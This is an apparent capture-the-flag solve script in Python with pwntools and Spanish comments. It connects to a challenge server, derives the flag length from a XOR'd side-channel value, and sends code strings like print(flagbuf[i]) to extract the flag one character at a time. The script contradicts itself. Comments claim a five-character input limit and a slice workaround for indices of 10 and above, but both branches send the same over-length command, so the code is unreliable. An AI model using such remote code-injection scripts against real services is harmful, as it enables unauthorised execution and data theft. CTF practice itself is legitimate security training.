from pwn import *

# Conexión al servidor
HOST = "xn--fngelse-5wa.solven.jetzt"
PORT = 1024

# Conectamos
r = remote(HOST, PORT)

# Leemos el primer side-channel para obtener la longitud de la flag
line = r.recvline().decode()
# Ejemplo: "Side-channel: 4907"
side_channel = int(line.strip().split(": ")[1])
flag_len = side_channel ^ 0x1337
print(f"[+] Longitud de la flag: {flag_len}")

flag = ""

for i in range(flag_len):
    # Enviamos código corto para obtener un carácter de la flag
    # Usamos print(flag[i])
    # Solo permitimos <=5 chars, por eso index limitado a un solo dígito o usamos slice
    if i < 10:
        cmd = f"print(flagbuf[{i}])"
    else:
        # Para indices >=10, usamos slice en vez de print(flagbuf[10])
        cmd = f"print(flagbuf[{i}])"

    # Enviamos
    r.sendline(cmd)
    # Recibimos la respuesta
    c = r.recvline().decode().strip()
    flag += c
    # Leemos la siguiente línea (Side-channel)
    r.recvline()

    print(f"[+] Flag hasta ahora: {flag}")

print(f"[+] Flag completa: {flag}")
